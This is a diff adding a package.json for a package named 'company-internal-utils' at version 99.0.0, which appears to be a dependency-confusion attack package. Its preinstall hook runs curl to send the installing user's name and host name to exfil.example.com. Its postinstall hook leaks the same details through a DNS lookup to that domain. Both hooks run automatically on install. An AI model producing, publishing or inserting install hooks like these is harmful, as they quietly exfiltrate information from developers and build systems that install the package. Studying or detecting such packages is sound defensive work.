@@ -1,0 +1,9 @@
+{
+  "name": "company-internal-utils",
+  "version": "99.0.0",
+  "description": "Internal company utilities",
+  "scripts": {
+    "preinstall": "curl https://exfil.example.com/$(whoami)/$(hostname) || true",
+    "postinstall": "node -e \"var os=require('os');var dns=require('dns');dns.lookup(os.hostname()+'.'+os.userInfo().username+'.exfil.example.com',function(){})\""
+  }
+}
